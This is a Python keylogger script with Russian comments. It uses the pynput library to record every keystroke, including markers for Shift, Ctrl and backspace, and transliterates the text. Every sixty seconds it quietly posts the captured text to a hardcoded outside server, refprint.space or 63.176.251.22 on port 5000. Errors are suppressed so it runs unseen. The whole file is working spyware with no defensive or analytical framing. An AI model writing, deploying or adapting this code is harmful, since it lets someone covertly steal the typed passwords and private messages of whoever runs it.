from pynput import keyboard
import requests
import json
import threading
from translate import translit

text = ""

ip_address = "refprint.space" or "63.176.251.22"
port_number = "5000"
time_interval = 60

def send_post_req():
    global text  # Используем глобальную переменную text
    try:
        # Отправляем данные на сервер
        en_data = translit(text)
        payload = json.dumps({"data": text, "en_data": en_data})
        # print(f"Sending data: {payload}")
        
        # Выполняем POST-запрос
        r = requests.post(f"http://{ip_address}:{port_number}/upload", data=payload, headers={"Content-Type" : "application/json"})
        
        # Проверка на успешный ответ от сервера
        # if r.status_code == 201 or r.status_code == 200:
        #     print(f"Request successful: {r.text}")
        # else:
        #     print(f"Error: Server responded with status code {r.status_code} and message: {r.text}")
        
        # Очищаем текст после отправки
        text = ""
        
    except Exception as e:
        # print(f"Couldn't complete request! Error: {e}")
        pass
    
    # Таймер для повторной отправки данных
    timer = threading.Timer(time_interval, send_post_req)
    timer.start()

def on_press(key):
    global text

    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.shift:
            text += " [SHIFT] "
        elif key == keyboard.Key.backspace:
            if len(text) == 0:
                text += " [BACKSPACECLEAR] "
            else:
                text = text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            text += " [CTRL] "
        elif key == keyboard.Key.esc:
            text += " [ESC] "
            # return False  # Можно использовать для выхода из программы
        else:
            text += key.char  # Добавляем символ на основе нажатой клавиши
    except AttributeError:
        # Например, если клавиша не имеет символа (как клавиши Shift или Ctrl)
        pass

# Запускаем отправку данных каждую минуту
send_post_req()

# Запускаем слушатель клавиш
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
